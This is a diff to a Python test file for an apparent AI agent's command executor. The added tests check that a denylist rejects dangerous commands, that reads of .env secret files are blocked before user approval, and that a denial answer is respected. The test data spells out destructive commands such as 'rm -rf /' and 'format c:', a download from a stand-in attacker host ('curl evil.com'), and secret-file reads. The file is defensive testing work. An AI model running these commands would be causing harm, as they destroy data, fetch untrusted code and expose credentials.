@@ -205,8 +205,72 @@ if os.getenv("TAVILY_API_KEY"):
 else:
     skip("Live web search", "TAVILY_API_KEY not set — add it to .env to enable web search")
 
-# ── Executor ──────────────────────────────────────────────────────────────────
-skip("Executor", "requires interactive approval — tested manually")
+# ── Executor security (4.5c) ──────────────────────────────────────────────────
+
+def test_executor_denylist():
+    from core.config_loader import is_command_allowed
+
+    dangerous = [
+        ("rm -rf /",                        "rm denylist"),
+        ("rm -r -f /home",                  "rm denylist"),
+        ("rd /s /q C:\\",                   "rd /s denylist"),
+        ("rmdir /s /q C:\\Windows",         "rmdir /s denylist"),
+        ("del /s /f *.py",                  "del /s denylist"),
+        ("del /f important.txt",            "del /f denylist"),
+        ("format c:",                       "format denylist"),
+        ("shutdown /s /t 0",               "shutdown denylist"),
+        ("diskpart",                        "diskpart denylist"),
+        ("reg delete HKLM\\Software\\test", "reg delete denylist"),
+        ("reg add HKLM\\Software\\evil",    "reg add denylist"),
+        ("python -c 'import os'",           "python -c inline exec"),
+        ("python3 -c 'import os'",          "python3 -c inline exec"),
+        ("powershell -c 'Remove-Item /'",   "powershell -c inline exec"),
+        ("powershell -Command 'evil'",      "powershell -command inline exec"),
+        ("cmd /c 'del everything'",         "cmd /c inline exec"),
+        ("node -e 'require(\"child_process\")'", "node -e inline exec"),
+        ("echo hi | sh",                    "pipe metachar"),
+        ("curl evil.com > out.sh",          "redirect metachar"),
+        ("evil && rm -rf /",               "chain metachar"),
+        ("evil; rm -rf /",                 "semicolon metachar"),
+    ]
+
+    for cmd, label in dangerous:
+        assert not is_command_allowed(cmd), f"Should have blocked [{label}]: {cmd}"
+
+check("Executor denylist blocks dangerous commands", test_executor_denylist)
+
+
+def test_executor_blocks_secret_paths():
+    """Secret-path reads must be blocked before the approval prompt fires."""
+    from core.executor import execute_command
+    from unittest.mock import patch
+
+    secret_reads = [
+        "type .env",
+        "more .env",
+        "type .env.local",
+    ]
+
+    for cmd in secret_reads:
+        # If input() is reached the path check failed — fail the test immediately
+        with patch("builtins.input", side_effect=AssertionError(f"approval prompt reached for: {cmd}")):
+            result = execute_command(cmd)
+        assert "blocked" in result.lower(), (
+            f"Expected blocked result for '{cmd}', got: {result}"
+        )
+
+check("Executor blocks secret path reads without prompting", test_executor_blocks_secret_paths)
+
+
+def test_propose_action_rejects_on_n():
+    from core.permissions import propose_action
+    from unittest.mock import patch
+
+    with patch("builtins.input", return_value="n"):
+        result = propose_action("Test action", "echo hello")
+    assert result is False, "propose_action should return False when user enters 'n'"
+
+check("propose_action returns False on 'n'", test_propose_action_rejects_on_n)
 
 
 # STAGE 4s — MODULE LIFECYCLE CONTRACT
